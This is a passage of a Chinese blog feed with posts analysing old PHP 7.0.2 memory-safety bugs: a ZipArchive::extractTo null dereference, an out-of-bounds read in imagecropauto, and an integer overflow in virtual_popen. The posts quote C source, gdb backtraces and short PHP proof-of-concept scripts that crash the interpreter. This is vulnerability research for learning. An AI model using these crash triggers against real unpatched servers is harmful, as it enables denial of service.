class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">static ZIPARCHIVE_METHOD(extractTo)</div><div class="line">&#123;</div><div class="line">	struct zip *intern;</div><div class="line"></div><div class="line">	zval *self = getThis();</div><div class="line">	zval *zval_files = NULL;</div><div class="line">	zval *zval_file = NULL;</div><div class="line">	php_stream_statbuf ssb;</div><div class="line">	char *pathto;</div><div class="line">	size_t pathto_len;</div><div class="line">	int ret, i;</div><div class="line"></div><div class="line">	int nelems;</div><div class="line"></div><div class="line">	if (!self) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;s|z&quot;, &amp;pathto, &amp;pathto_len, &amp;zval_files) == FAILURE) &#123;</div><div class="line">		return;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (pathto_len &lt; 1) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if (php_stream_stat_path_ex(pathto, PHP_STREAM_URL_STAT_QUIET, &amp;ssb, NULL) &lt; 0) &#123;</div><div class="line">			ret = php_stream_mkdir(pathto, 0777,  PHP_STREAM_MKDIR_RECURSIVE, NULL);</div><div class="line">			if (!ret) &#123;</div><div class="line">					RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	ZIP_FROM_OBJECT(intern, self);</div><div class="line">	if (zval_files &amp;&amp; (Z_TYPE_P(zval_files) != IS_NULL)) &#123;</div><div class="line">		switch (Z_TYPE_P(zval_files)) &#123;</div><div class="line">			case IS_STRING:</div><div class="line">				if (!php_zip_extract_file(intern, pathto, Z_STRVAL_P(zval_files), Z_STRLEN_P(zval_files))) &#123;</div><div class="line">					RETURN_FALSE;</div><div class="line">				&#125;</div><div class="line">				break;</div><div class="line">			case IS_ARRAY:</div><div class="line">				nelems = zend_hash_num_elements(Z_ARRVAL_P(zval_files));</div><div class="line">				if (nelems == 0 ) &#123;</div><div class="line">					RETURN_FALSE;</div><div class="line">				&#125;</div><div class="line">				for (i = 0; i &lt; nelems; i++) &#123;</div><div class="line">					if ((zval_file = zend_hash_index_find(Z_ARRVAL_P(zval_files), i)) != NULL) &#123;</div><div class="line">						switch (Z_TYPE_P(zval_file)) &#123;</div><div class="line">							case IS_LONG:</div><div class="line">								break;</div><div class="line">							case IS_STRING:</div><div class="line">								if (!php_zip_extract_file(intern, pathto, Z_STRVAL_P(zval_file), Z_STRLEN_P(zval_file))) &#123;</div><div class="line">									RETURN_FALSE;</div><div class="line">								&#125;</div><div class="line">								break;</div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				break;</div><div class="line">			case IS_LONG:</div><div class="line">			default:</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Invalid argument, expect string or array of strings&quot;);</div><div class="line">				break;</div><div class="line">		&#125;</div><div class="line">	&#125; else &#123;</div><div class="line">		/* Extract all files */</div><div class="line">		int filecount = zip_get_num_files(intern);</div><div class="line"></div><div class="line">		if (filecount == -1) &#123;</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Illegal archive&quot;);</div><div class="line">				RETURN_FALSE;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		for (i = 0; i &lt; filecount; i++) &#123;</div><div class="line">			char *file = (char*)zip_get_name(intern, i, ZIP_FL_UNCHANGED);</div><div class="line">			if (!php_zip_extract_file(intern, pathto, file, strlen(file))) &#123;    //这里跟踪进去就行了。</div><div class="line">					RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	RETURN_TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里上面有个判断语句，是else调用了这个函数，可以用gdb自己调试一下，就会知道是在哪里调用了。<br>下面这个函数我就不放完整代码了，就放关键的地方吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">static int php_zip_extract_file(struct zip * za, char *dest, char *file, int file_len)</div><div class="line">&#123;</div><div class="line">	php_stream_statbuf ssb;</div><div class="line">	struct zip_file *zf;</div><div class="line">	struct zip_stat sb;</div><div class="line">	char b[8192];</div><div class="line">	int n, len, ret;</div><div class="line">	php_stream *stream;</div><div class="line">	char *fullpath;</div><div class="line">	char *file_dirname_fullpath;</div><div class="line">	char file_dirname[MAXPATHLEN];</div><div class="line">	size_t dir_len;</div><div class="line">	int is_dir_only = 0;</div><div class="line">	char *path_cleaned;</div><div class="line">	size_t path_cleaned_len;</div><div class="line">	cwd_state new_state;</div><div class="line">	zend_string *file_basename;</div><div class="line"></div><div class="line">	new_state.cwd = CWD_STATE_ALLOC(1);</div><div class="line">	new_state.cwd[0] = &apos;\0&apos;;</div><div class="line">	new_state.cwd_length = 0;</div><div class="line"></div><div class="line">	/* Clean/normlize the path and then transform any path (absolute or relative)</div><div class="line">		 to a path relative to cwd (../../mydir/foo.txt &gt; mydir/foo.txt)</div><div class="line">	 */</div><div class="line">	virtual_file_ex(&amp;new_state, file, NULL, CWD_EXPAND);</div></pre></td></tr></table></figure></p>
<p>下面就是最底层引用空指针的地方。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CWD_API int virtual_file_ex(cwd_state *state, const char *path, verify_path_func verify_path, int use_realpath) /* &#123;&#123;&#123; */</div><div class="line">&#123;</div><div class="line">	int path_length = (int)strlen(path); //这里就造成了段错误。</div></pre></td></tr></table></figure></p>
<p>poc我放不放都无所，参考文章里有，我想说下面的三个函数缺一不可，有可能哪个地方对传入的文件做了检查，不过我没找，所以整个完整的详细过程我也不是很清楚。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$zip = new ZipArchive();</div><div class="line">$zip-&gt;open(&quot;/opt/test.php&quot;,ZIPARCHIVE::CREATE);</div><div class="line">var_dump($zip-&gt;addEmptyDir(&quot;fosadsao&quot;));</div><div class="line">$zip-&gt;extractTo(&quot;sdsadsa&quot;);</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">strlen () at ../sysdeps/x86_64/strlen.S:106</div><div class="line">106	../sysdeps/x86_64/strlen.S: No such file or directory.</div><div class="line">(gdb) bt</div><div class="line">#0  strlen () at ../sysdeps/x86_64/strlen.S:106</div><div class="line">#1  0x000000000084c598 in virtual_file_ex (state=state@entry=0x7fffffff7b90, </div><div class="line">    path=path@entry=0x0, verify_path=verify_path@entry=0x0, </div><div class="line">    use_realpath=use_realpath@entry=0) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1179</div><div class="line">#2  0x0000000000779595 in php_zip_extract_file (za=za@entry=0x10aecf0, </div><div class="line">    dest=0x7ffff1662498 &quot;sdsadsa&quot;, file=0x0, file_len=&lt;optimized out&gt;)</div><div class="line">    at /root/php-7.0.2/ext/zip/php_zip.c:161</div><div class="line">#3  0x0000000000779ae1 in c_ziparchive_extractTo (execute_data=&lt;optimized out&gt;, </div><div class="line">    return_value=0x7ffff1613100) at /root/php-7.0.2/ext/zip/php_zip.c:2671</div><div class="line">#4  0x00000000008a1574 in ZEND_DO_FCALL_SPEC_HANDLER ()</div><div class="line">    at /root/php-7.0.2/Zend/zend_vm_execute.h:842</div><div class="line">#5  0x000000000085decb in execute_ex (ex=&lt;optimized out&gt;)</div><div class="line">    at /root/php-7.0.2/Zend/zend_vm_execute.h:414</div><div class="line">#6  0x00000000008aed09 in zend_execute (op_array=&lt;optimized out&gt;, </div><div class="line">    return_value=&lt;optimized out&gt;) at /root/php-7.0.2/Zend/zend_vm_execute.h:458</div><div class="line">#7  0x000000000081e477 in zend_execute_scripts (type=type@entry=8, </div><div class="line">    retval=retval@entry=0x0, file_count=file_count@entry=3)</div><div class="line">    at /root/php-7.0.2/Zend/zend.c:1427</div><div class="line">#8  0x00000000007b2960 in php_execute_script (</div><div class="line">    primary_file=primary_file@entry=0x7fffffffd290) at /root/php-7.0.2/main/main.c:2471</div><div class="line">#9  0x00000000008b0b73 in do_cli (argc=2, argv=0xe97a30)</div><div class="line">    at /root/php-7.0.2/sapi/cli/php_cli.c:974</div><div class="line">#10 0x0000000000441480 in main (argc=2, argv=0xe97a30)</div><div class="line">    at /root/php-7.0.2/sapi/cli/php_cli.c:1345</div></pre></td></tr></table></figure>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这次的分享是一次失败的分享，主要是水平有限吧，期待高手来详细解释一下。后面可能会陆续放出double free和UAF的案例，不过关于php的垃圾回收机制我还不太了解，所以UAF的漏洞估计会要很久，不过网上已经有人分析，我如果要将的话也只能选另外一个cve讲讲，原理大致都差不多的，毕竟用C写的。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=71561" target="_blank" rel="external">https://bugs.php.net/bug.php?id=71561</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Out of bounds access]]></title>
      <url>http://yoursite.com/2017/02/18/Out-of-bounds-access/</url>
      <content type="html"><![CDATA[<h1 id="Out-of-bounds-php漏洞挖掘系列三"><a href="#Out-of-bounds-php漏洞挖掘系列三" class="headerlink" title="Out of bounds (php漏洞挖掘系列三)"></a>Out of bounds (php漏洞挖掘系列三)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>看标题就知道了是数组越界的漏洞，本次要说的是数组越界的漏洞，参考的文章已经写得很清楚了，不过是我把我自己的理解以中文的方式表达出来而已。说来奇怪不知道为什么这个漏洞没上CVE。说个挖数组越界漏洞搞得小技巧，搜索”[“这个数组符号，然后对于出来的结果一个个的去审查吧，不过目前已经很难挖出来了，因为我已经亲自尝试过来，然而就是挖不出来，哈哈。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>不过说废话，直接上函数代码。这次我们逆向思维分析，不是逆向工程那个逆向哈。</p>
<p>看到下面的这段代码没，这里如果不是真彩色的话，就调用后面(im)-&gt;red[(c)，所以等会创建颜色的时候要注意。这里的颜色最大值为256。这里我就不放代码了，自己搜索吧，在gdImagePtrzh这个类型的结构体里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define gdImageRed(im, c) ((im)-&gt;trueColor ? gdTrueColorGetRed(c) : \</div><div class="line">	(im)-&gt;red[(c)])</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static int gdColorMatch(gdImagePtr im, int col1, int col2, float threshold)</div><div class="line">&#123;</div><div class="line">	const int dr = gdImageRed(im, col1) - gdImageRed(im, col2); //这里往下都造成了数组越界的问题。</div><div class="line">	const int dg = gdImageGreen(im, col1) - gdImageGreen(im, col2);  </div><div class="line">	const int db = gdImageBlue(im, col1) - gdImageBlue(im, col2);</div><div class="line">	const int da = gdImageAlpha(im, col1) - gdImageAlpha(im, col2);</div><div class="line">	const double dist = sqrt(dr * dr + dg * dg + db * db + da * da);</div><div class="line">	const double dist_perc = sqrt(dist / (255^2 + 255^2 + 255^2));</div><div class="line">	return (dist_perc &lt;= threshold);</div><div class="line">	//return (100.0 * dist / 195075) &lt; threshold;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后网上搜索，调用这个函数的如果检查不到位的话都会触发漏洞，然后下面这个函数调用了gdColorMatach。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">gdImagePtr gdImageCropThreshold(gdImagePtr im, const unsigned int color, const float threshold)</div><div class="line">&#123;</div><div class="line">	const int width = gdImageSX(im);</div><div class="line">	const int height = gdImageSY(im);</div><div class="line"></div><div class="line">	int x,y;</div><div class="line">	int match;</div><div class="line">	gdRect crop;</div><div class="line"></div><div class="line">	crop.x = 0;</div><div class="line">	crop.y = 0;</div><div class="line">	crop.width = 0;</div><div class="line">	crop.height = 0;</div><div class="line"></div><div class="line">	/* Pierre: crop everything sounds bad */</div><div class="line">	if (threshold &gt; 1.0) &#123;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	/* TODO: Add gdImageGetRowPtr and works with ptr at the row level</div><div class="line">	 * for the true color and palette images</div><div class="line">	 * new formats will simply work with ptr</div><div class="line">	 */</div><div class="line">	match = 1;</div><div class="line">	for (y = 0; match &amp;&amp; y &lt; height; y++) &#123;</div><div class="line">		for (x = 0; match &amp;&amp; x &lt; width; x++) &#123;</div><div class="line">			match = (gdColorMatch(im, color, gdImageGetPixel(im, x,y), threshold)) &gt; 0;</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>然后再搜索哪个函数调用了这个代码，最终定位到顶层函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(imagecropauto)</div><div class="line">&#123;</div><div class="line">	zval *IM;</div><div class="line">	zend_long mode = -1;</div><div class="line">	zend_long color = -1;</div><div class="line">	double threshold = 0.5f;</div><div class="line">	gdImagePtr im;</div><div class="line">	gdImagePtr im_crop;</div><div class="line"></div><div class="line">	if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;r|ldl&quot;, &amp;IM, &amp;mode, &amp;threshold, &amp;color) == FAILURE)  &#123;</div><div class="line">		return;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if ((im = (gdImagePtr)zend_fetch_resource(Z_RES_P(IM), &quot;Image&quot;, le_gd)) == NULL) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	switch (mode) &#123;</div><div class="line">		case -1:</div><div class="line">			mode = GD_CROP_DEFAULT;</div><div class="line">		case GD_CROP_DEFAULT:</div><div class="line">		case GD_CROP_TRANSPARENT:</div><div class="line">		case GD_CROP_BLACK:</div><div class="line">		case GD_CROP_WHITE:</div><div class="line">		case GD_CROP_SIDES:</div><div class="line">			im_crop = gdImageCropAuto(im, mode);</div><div class="line">			break;</div><div class="line"></div><div class="line">		case GD_CROP_THRESHOLD:</div><div class="line">			if (color &lt; 0) &#123;</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Color argument missing with threshold mode&quot;);  //这里做了检查然后没啥卵用。</div><div class="line">				RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">			im_crop = gdImageCropThreshold(im, color, (float) threshold);  //这里调用了这个函数</div><div class="line">			break;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$image=imagecreate(1000,1020);</div><div class="line">var_dump(imagecropauto($image,IMG_CROP_THRESHOLD,1,8888888));</div></pre></td></tr></table></figure>
<p>我发现了一个奇怪的问题就是，color的数值小一点就会报错，看函数也没调用overflow这个区做安全检查，不知道是哪里出问题了。调试信息放不放都无所谓了。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>本来想找个有趣的数组越界的问题，我记忆中中sqrt函数造成的问题，传进去负数之后会颠倒位置，就造成了最后的结果过大造成数组越界，最终找来找去还是没找到。只能用这个函数做案例了。终于要到驾照上课去了，这边文章就写到这里吧，有问题欢迎指出。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=72494" target="_blank" rel="external">https://bugs.php.net/bug.php?id=72494</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Heap-based buffer overflow]]></title>
      <url>http://yoursite.com/2017/02/17/Heap-based-buffer-overflow/</url>
      <content type="html"><![CDATA[<h1 id="Heap-based-integer-overflow-php漏洞挖掘系列之二"><a href="#Heap-based-integer-overflow-php漏洞挖掘系列之二" class="headerlink" title="Heap-based integer overflow(php漏洞挖掘系列之二)"></a>Heap-based integer overflow(php漏洞挖掘系列之二)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这个漏洞是玄武实验室的人挖出来的，我这边做一下分享吧。我们不是漏洞挖掘者，只是漏洞搬运者。好了，进入正题吧，这篇文章主要讲述的是基于堆的缓冲区溢出，找了好久终于找到一个比较简单易懂的漏洞进行分析。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先放代码，这段代码在zend_virtual_cwd.c的1853行，可以看出是unix环境使用的函数。然而没啥卵用。这个函数是执行命令的底层调用函数，具体我就不往上找了麻烦，从代码中就可以大致看的出来。php执行命令的函数还是挺多的，我就不列举了，在poc中我用的是system函数。然后就进入漏洞分析环节了。请看代码注释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#else /* Unix */</div><div class="line">CWD_API FILE *virtual_popen(const char *command, const char *type) /* &#123;&#123;&#123; */</div><div class="line">&#123;</div><div class="line">	int command_length;  //int型的长度在32位中为0x7fffffff</div><div class="line">	int dir_length, extra = 0;</div><div class="line">	char *command_line;</div><div class="line">	char *ptr, *dir;</div><div class="line">	FILE *retval;</div><div class="line"></div><div class="line">	command_length = strlen(command);  //这里统计命令的字符串长度，</div><div class="line"></div><div class="line">	dir_length = CWDG(cwd).cwd_length; </div><div class="line">	dir = CWDG(cwd).cwd;</div><div class="line">	while (dir_length &gt; 0) &#123;</div><div class="line">		if (*dir == &apos;\&apos;&apos;) extra+=3;</div><div class="line">		dir++;</div><div class="line">		dir_length--;</div><div class="line">	&#125;</div><div class="line">	dir_length = CWDG(cwd).cwd_length;//脚本路径的长度</div><div class="line">	dir = CWDG(cwd).cwd;</div><div class="line"></div><div class="line">	ptr = command_line = (char *) emalloc(command_length + sizeof(&quot;cd &apos;&apos; ; &quot;) + dir_length + extra+1+1);  //这边变成了emalloc(0)，等会看调试信息</div><div class="line">	if (!command_line) &#123;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line">	memcpy(ptr, &quot;cd &quot;, sizeof(&quot;cd &quot;)-1);</div><div class="line">	ptr += sizeof(&quot;cd &quot;)-1;</div><div class="line"></div><div class="line">	if (CWDG(cwd).cwd_length == 0) &#123;</div><div class="line">		*ptr++ = DEFAULT_SLASH;</div><div class="line">	&#125; else &#123;</div><div class="line">		*ptr++ = &apos;\&apos;&apos;;</div><div class="line">		while (dir_length &gt; 0) &#123;</div><div class="line">			switch (*dir) &#123;</div><div class="line">			case &apos;\&apos;&apos;:</div><div class="line">				*ptr++ = &apos;\&apos;&apos;;</div><div class="line">				*ptr++ = &apos;\\&apos;;</div><div class="line">				*ptr++ = &apos;\&apos;&apos;;</div><div class="line">				/* fall-through */</div><div class="line">			default:</div><div class="line">				*ptr++ = *dir;</div><div class="line">			&#125;</div><div class="line">			dir++;</div><div class="line">			dir_length--;</div><div class="line">		&#125;</div><div class="line">		*ptr++ = &apos;\&apos;&apos;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	*ptr++ = &apos; &apos;;</div><div class="line">	*ptr++ = &apos;;&apos;;</div><div class="line">	*ptr++ = &apos; &apos;;</div><div class="line"></div><div class="line">	memcpy(ptr, command, command_length+1);  //这里command_length+1=0xfffffff1 大于申请的堆空间，所以复制后造成溢出</div><div class="line">	retval = popen(command_line, type);</div><div class="line"></div><div class="line">	efree(command_line);</div><div class="line">	return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>gdb调试信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">root@mhn:~# gdb -q --args php-7.0.2/sapi/cli/php -n test.php </div><div class="line">Reading symbols from php-7.0.2/sapi/cli/php...done.</div><div class="line">(gdb) b zend_virtual_cwd.c:1873</div><div class="line">Breakpoint 1 at 0x84d8b4: file /root/php-7.0.2/Zend/zend_virtual_cwd.c, line 1873.</div><div class="line">(gdb) b zend_virtual_cwd.c:1904</div><div class="line">Breakpoint 2 at 0x84d979: file /root/php-7.0.2/Zend/zend_virtual_cwd.c, line 1904.</div><div class="line">(gdb) r</div><div class="line">Starting program: /root/php-7.0.2/sapi/cli/php -n test.php</div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</div><div class="line"></div><div class="line">Breakpoint 1, virtual_popen (</div><div class="line">    command=command@entry=0x7ffef1200018 &apos;/&apos; &lt;repeats 200 times&gt;..., </div><div class="line">    type=type@entry=0xae66bb &quot;r&quot;) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1873</div><div class="line">1873		ptr = command_line = (char *) emalloc(command_length + sizeof(&quot;cd &apos;&apos; ; &quot;) + dir_length + extra+1+1);</div><div class="line">(gdb) p command_length</div><div class="line">$1 = -16</div><div class="line">(gdb) p sizeof(&quot;cd &apos;&apos; ; &quot;)</div><div class="line">$2 = 9</div><div class="line">(gdb) p dir_length</div><div class="line">$3 = 5</div><div class="line">(gdb) p extra</div><div class="line">$4 = 0    //可以看到这边加起来为0，其实这样比较容易理解。</div><div class="line"></div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, virtual_popen (</div><div class="line">    command=command@entry=0x7ffef1200018 &apos;/&apos; &lt;repeats 200 times&gt;..., </div><div class="line">    type=type@entry=0xae66bb &quot;r&quot;) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1904</div><div class="line">1904		memcpy(ptr, command, command_length+1);</div><div class="line">(gdb) p command_length+1</div><div class="line">$5 = -15</div><div class="line">(gdb) n</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152</div><div class="line">152	../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;?php</div><div class="line">    ini_set(&apos;memory_limit&apos;, -1);</div><div class="line">    $cmd = str_repeat(&quot;/&quot;, 0xfffffff0);</div><div class="line">    system($cmd);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>我想看到这里也看明白了，正是因为command_length的类型为int，后面再malloc中又转化size_t类型，然后整数溢出了。poc也就那样，很容易理解。不过在linux上的exp还没怎么学习过，后续可能会学习一下。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这种漏洞现在感觉也很难挖，我看了好几天都没找出一个漏洞，也许因为功力不够吧。如果本章内容讲解错误，欢迎指出。我qq499671216。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=73025" target="_blank" rel="external">https://bugs.php.net/bug.php?id=73025</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[stack-based integer overflow]]></title>
      <url>http://yoursite.com/2017/02/16/stack-based-integer-overflow/</url>
      <content type="html"><![CDATA[<h1 id="Stack-based-integer-overlow（php漏洞挖掘系列之一）"><a href="#Stack-based-integer-overlow（php漏洞挖掘系列之一）" class="headerlink" title="Stack-based integer overlow（php漏洞挖掘系列之一）"></a>Stack-based integer overlow（php漏洞挖掘系列之一）</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>首先声明这些漏洞不是我挖的，我想挖但是挖不出来，蛋疼。本次讲解栈溢出漏洞，这个漏洞是比较常见的漏洞，现在不太好挖了，变量跟踪的你头痛死，没有啥好工具，只能人工慢慢的看，可能我孤陋寡闻吧。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先下载源码<a href="http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。" target="_blank" rel="external">http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。</a></p>
